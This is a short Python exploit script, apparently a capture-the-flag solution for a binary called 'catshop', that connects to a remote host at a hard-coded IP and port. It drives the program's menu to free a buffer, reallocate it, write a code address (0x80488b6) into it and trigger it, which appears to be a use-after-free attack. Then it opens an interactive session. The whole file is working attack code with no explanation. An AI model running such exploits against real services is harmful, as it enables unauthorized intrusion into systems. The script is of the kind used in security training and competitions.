from yeonnic import *

elf=ELF("./catshop")

#p=process("./catshop")
p=remote("211.117.60.76", 8888)

gdb_attach(p,"tracemalloc on\nc")

print p.recv()

p.send(p32(1))
time.sleep(0.1)
print p.recv()
p.send(p32(2))
time.sleep(0.1)
print p.recv()
p.send(p32(4))
time.sleep(0.1)
print p.recv()
p.send(p32(0x1000))
time.sleep(0.1)
print p.recv()
p.sendline(p32(0x80488b6))
time.sleep(0.1)
print p.recv()

p.sendline(p32(3))


p.interactive()
